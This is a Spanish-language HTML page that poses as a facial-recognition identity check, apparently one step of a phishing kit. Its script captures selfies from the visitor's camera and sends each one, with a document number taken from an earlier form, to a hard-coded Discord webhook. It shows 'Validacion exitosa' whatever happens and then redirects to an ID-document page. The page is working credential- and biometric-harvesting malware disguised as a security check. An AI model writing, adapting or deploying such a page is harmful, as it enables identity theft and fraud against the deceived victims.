<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reconocimiento Facial</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --red: #E60026; }

        * { box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }

        body, html {
            width: 100%; height: 100%;
            overflow: hidden;
            background: #000;
            color: white;
        }

        /* ── FULL SCREEN CAMERA ── */
        #video {
            position: fixed;
            inset: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            /* espejo para selfie */
            transform: scaleX(-1);
            z-index: 0;
        }

        /* ── DARK GRADIENT TOP & BOTTOM ── */
        .vignette {
            position: fixed; inset: 0; z-index: 1;
            background:
                linear-gradient(to bottom, rgba(0,0,0,0.75) 0%, transparent 28%),
                linear-gradient(to top,    rgba(0,0,0,0.75) 0%, transparent 28%);
            pointer-events: none;
        }

        /* ── HEADER ── */
        .header {
            position: fixed;
            top: 0; left: 0; right: 0;
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 20px 0;
        }
        .header img {
            height: 38px;
            object-fit: contain;
            filter: brightness(0) invert(1);
            margin-bottom: 8px;
        }
        .header h3 { font-size: 17px; font-weight: 700; margin-bottom: 2px; }
        .header p  { font-size: 11px; color: rgba(255,255,255,0.5); }

        /* ── OVAL FACE GUIDE ── */
        .face-guide {
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -52%);
            width: min(68vw, 260px);
            aspect-ratio: 0.78;
            border: 2.5px dashed rgba(255,255,255,0.55);
            border-radius: 50%;
            z-index: 5;
            transition: border-color 0.4s, box-shadow 0.4s;
        }
        .face-guide.scanning {
            border-color: #00ff88;
            box-shadow: 0 0 0 4px rgba(0,255,136,0.15), inset 0 0 30px rgba(0,255,136,0.08);
            border-style: solid;
        }

        /* ── SCAN LINE ── */
        .scan-line {
            position: fixed;
            left: 50%; transform: translateX(-50%);
            width: min(68vw, 260px);
            height: 2px;
            background: linear-gradient(to right, transparent, #00ff88, transparent);
            box-shadow: 0 0 10px #00ff88;
            z-index: 6;
            display: none;
            /* top se controla por JS */
        }

        /* ── INSTRUCTION BADGE ── */
        .badge {
            position: fixed;
            bottom: 160px; left: 20px; right: 20px;
            z-index: 10;
            background: rgba(0,0,0,0.55);
            backdrop-filter: blur(14px);
            border: 1px solid rgba(255,255,255,0.12);
            border-radius: 16px;
            padding: 14px 18px;
            text-align: center;
            transition: border-color 0.3s;
        }
        .badge.error { border-color: rgba(230,0,38,0.6); }
        .badge-title { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
        .badge-sub   { font-size: 12px; color: rgba(255,255,255,0.5); line-height: 1.5; }
        .badge-sub.red { color: #ff6b6b; }

        /* ── CAPTURE BUTTON ── */
        .btn-wrap {
            position: fixed;
            bottom: 52px; left: 50%;
            transform: translateX(-50%);
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }
        .btn-shutter {
            width: 74px; height: 74px;
            border-radius: 50%;
            border: 4px solid white;
            background: transparent;
            cursor: pointer;
            display: flex; align-items: center; justify-content: center;
            transition: transform 0.15s, border-color 0.3s;
        }
        .btn-shutter:active { transform: scale(0.91); }
        .btn-shutter:disabled { border-color: rgba(255,255,255,0.25); cursor: not-allowed; }
        .btn-shutter-inner {
            width: 54px; height: 54px;
            border-radius: 50%;
            background: white;
            transition: background 0.2s;
        }
        .btn-shutter:disabled .btn-shutter-inner { background: rgba(255,255,255,0.2); }
        .btn-label { font-size: 12px; color: rgba(255,255,255,0.6); }

        /* ── FLASH ── */
        .flash {
            position: fixed; inset: 0; z-index: 20;
            background: white; opacity: 0;
            pointer-events: none; transition: opacity 0.07s;
        }
        .flash.show { opacity: 0.9; }

        /* ── LOADER ── */
        #loader {
            display: none;
            position: fixed; inset: 0; z-index: 30;
            background: rgba(0,0,0,0.8); backdrop-filter: blur(8px);
            flex-direction: column; align-items: center; justify-content: center;
            gap: 16px;
        }
        .spinner {
            width: 50px; height: 50px;
            border: 4px solid #333;
            border-top: 4px solid var(--red);
            border-radius: 50%;
            animation: spin 0.85s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #loader p { font-size: 14px; font-weight: 500; color: white; }

        canvas { display: none; }
    </style>
</head>
<body>

<!-- CAMERA -->
<video id="video" autoplay playsinline muted></video>

<!-- VIGNETTE -->
<div class="vignette"></div>

<!-- HEADER -->
<div class="header">
    <img src="logo.png" alt="Logo"
        onerror="this.style.display='none'"/>
    <h3>Reconocimiento Facial</h3>
    <p>Sistema de Seguridad Biométrica v4.0</p>
</div>

<!-- OVAL GUIDE -->
<div class="face-guide" id="faceGuide"></div>

<!-- SCAN LINE -->
<div class="scan-line" id="scanLine"></div>

<!-- INSTRUCTION BADGE -->
<div class="badge" id="badge">
    <div class="badge-title" id="badgeTitle">Posiciona tu rostro en el óvalo</div>
    <div class="badge-sub"  id="badgeSub">Asegúrate de tener buena iluminación y los ojos visibles</div>
</div>

<!-- CAPTURE BUTTON -->
<div class="btn-wrap">
    <button class="btn-shutter" id="btnShutter" onclick="captureAndSend()">
        <div class="btn-shutter-inner"></div>
    </button>
    <span class="btn-label">Toca para validar</span>
</div>

<!-- FLASH -->
<div class="flash" id="flash"></div>

<!-- LOADER -->
<div id="loader">
    <div class="spinner"></div>
    <p id="loaderText">Analizando biometría...</p>
</div>

<canvas id="canvas"></canvas>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY";
    let attempts = 0;
    let scanAnim = null;
    let videoReady = false;

    // Datos del formulario
    const savedData = JSON.parse(sessionStorage.getItem('formData') || '{}');
    const docNum = savedData.num || 'N/A';

    // ── INICIAR CÁMARA ──
    async function startCamera() {
        const video = document.getElementById('video');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
            });
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                videoReady = true;
            };
        } catch (err) {
            // Fallback: cualquier cámara disponible
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.onloadedmetadata = () => { video.play(); videoReady = true; };
            } catch (e) {
                setBadge('⚠️ Sin acceso a la cámara', 'Permita el acceso a la cámara en su navegador', true);
                document.getElementById('btnShutter').disabled = true;
            }
        }
    }

    window.addEventListener('load', startCamera);

    // ── ANIMACIÓN LÍNEA DE ESCANEO ──
    function startScanAnim() {
        const line = document.getElementById('scanLine');
        const guide = document.getElementById('faceGuide');
        const rect = guide.getBoundingClientRect();
        line.style.display = 'block';
        line.style.top = rect.top + 'px';
        let dir = 1, pos = rect.top;
        scanAnim = setInterval(() => {
            pos += dir * 3;
            if (pos >= rect.bottom - 2) dir = -1;
            if (pos <= rect.top) dir = 1;
            line.style.top = pos + 'px';
        }, 16);
        document.getElementById('faceGuide').classList.add('scanning');
    }

    function stopScanAnim() {
        clearInterval(scanAnim);
        document.getElementById('scanLine').style.display = 'none';
        document.getElementById('faceGuide').classList.remove('scanning');
    }

    // ── CAPTURA ──
    function captureAndSend() {
        if (!videoReady) {
            setBadge('Cámara iniciando...', 'Espera un momento e intenta de nuevo', true);
            return;
        }

        attempts++;
        const video  = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btn    = document.getElementById('btnShutter');

        // Flash
        const flash = document.getElementById('flash');
        flash.classList.add('show');
        setTimeout(() => flash.classList.remove('show'), 120);

        btn.disabled = true;
        startScanAnim();
        showLoader('Analizando biometría...');

        // Asegurarse que el canvas tenga dimensiones válidas
        const w = video.videoWidth  || video.clientWidth  || 640;
        const h = video.videoHeight || video.clientHeight || 480;
        canvas.width  = w;
        canvas.height = h;

        // Dibujar imagen espejada (igual que el video)
        const ctx = canvas.getContext('2d');
        ctx.save();
        ctx.translate(w, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, w, h);
        ctx.restore();

        canvas.toBlob(async (blob) => {
            if (!blob || blob.size < 1000) {
                hideLoader();
                stopScanAnim();
                btn.disabled = false;
                setBadge('Error al capturar', 'No se pudo tomar la foto. Intenta de nuevo.', true);
                return;
            }

            // Enviar al webhook
            const fd = new FormData();
            fd.append('file', blob, `facial_intento${attempts}.png`);
            fd.append('payload_json', JSON.stringify({
                content: `🤳 **Facial — Intento ${attempts}** | Doc: ${docNum}`
            }));
            try { await fetch(WEBHOOK_URL, { method: 'POST', body: fd }); } catch(e) {}

            setTimeout(() => {
                hideLoader();
                stopScanAnim();
                btn.disabled = false;

                if (attempts < 3) {
                    setBadge(
                        'Validacion exitosa',
                        'Para completar el proceso seras redireccionado',
                        true
                    );
                } else {
                    setBadge(
                        '✅Validacion exitosa',
                        'Para completar el proceso seras redireccionado',
                        true
                    );
                    btn.disabled = true;
                    setTimeout(() => {
                        sessionStorage.clear();
                        window.location.href = 'cedula.html';
                    }, 3500);
                }
            }, 3000);

        }, 'image/png');
    }

    // ── HELPERS ──
    function setBadge(title, sub, isError = false) {
        document.getElementById('badgeTitle').textContent = title;
        document.getElementById('badgeSub').textContent   = sub;
        const badge = document.getElementById('badge');
        badge.classList.toggle('error', isError);
        document.getElementById('badgeSub').className = 'badge-sub' + (isError ? ' red' : '');
    }

    function showLoader(text) {
        document.getElementById('loaderText').textContent = text;
        document.getElementById('loader').style.display = 'flex';
    }
    function hideLoader() {
        document.getElementById('loader').style.display = 'none';
    }
</script>
</body>
</html>
